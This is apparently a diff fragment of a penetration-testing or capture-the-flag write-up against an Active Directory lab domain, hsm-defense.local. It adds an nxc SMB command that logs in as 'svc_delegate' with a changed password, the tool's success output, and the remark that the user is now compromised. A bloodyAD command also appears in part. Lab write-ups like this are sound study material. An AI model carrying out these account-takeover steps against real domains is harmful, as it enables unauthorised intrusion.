@@ -795,5 +795,10 @@ bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'itops01$' -p 'paSS
 Then ill change the password of the user
 
 ```python
-
+nxc smb dc.hsm-defense.local -u 'svc_delegate' -p 'Password123!' -k                   
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\svc_delegate:Password123!
 ```
+
+This user is now compromised
+
